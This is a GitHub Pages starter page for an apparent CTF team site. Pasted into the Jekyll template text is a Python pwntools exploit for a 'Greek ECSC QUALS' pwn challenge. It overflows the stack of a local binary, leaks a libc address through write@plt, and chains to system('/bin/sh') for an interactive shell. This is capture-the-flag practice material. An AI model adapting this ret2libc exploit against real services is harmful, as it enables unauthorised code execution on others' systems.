## Welcome to Fuzzer's Palace

You can use the [editor on GitHub](https://github.com/Fuzz3rCTF/Fuzz3rCTF.github.io/edit/master/index.md) to maintain and preview the content for your website in Markdown files.

Whenever you commit to this repository, GitHub Pages will run [Jekyll](https://jekyllrb.com/) to rebuild the pages in your site, from the content in your Markdown files.

### Greek ECSC QUALS-Pwn Challenge
```python
from pwn import *
from struct import pack, unpack


def pwn():
    p = lambda x : pack("I",x)
    r = process('./bombsaway')
    print r.recv()
    r.sendline('test')
    print r.recv()
    r.sendline('2')
    print r.recv()
    payload = 'A'*556
    payload += p32(0x080483b0) # plt of write
    payload += p32(0x08048400) # ret
    payload += p32(0x1)
    payload += p32(0x080f700c) # read in got
    payload += p32(0x4) #leak

    r.sendline(payload)
    rec = r.recvuntil('Password:')
    print rec
    i = 40
    rec = rec[i:i+4]
    read_libc = unpack('I', rec)[0]
    print '[+] Libc addr of read: '+hex(read_libc)
    libc_base = read_libc-0x0e5620
    print '[+] Libc base: '+hex(libc_base)
    sys = p(libc_base+0x03cd10)
    lol = p(libc_base+0x123456)
    binsh = p(libc_base+0x17b8cf)
    r.sendline('test')
    r.recvuntil('Option:')
    r.sendline('2')
    r.recvuntil(':')
    fpayload = 'A'*544
    fpayload += sys
    fpayload += lol
    fpayload += binsh
    r.sendline(fpayload)
    r.interactive()

pwn()
```

**Bold** and _Italic_ and `Code` text

[Link](url) and ![Image](src)
```

For more details see [GitHub Flavored Markdown](https://guides.github.com/features/mastering-markdown/).

### Jekyll Themes

Your Pages site will use the layout and styles from the Jekyll theme you have selected in your [repository settings](https://github.com/Fuzz3rCTF/Fuzz3rCTF.github.io/settings). The name of this theme is saved in the Jekyll `_config.yml` configuration file.

### Support or Contact

[Twitter](https://www.twitter.com/proud_skid/) 
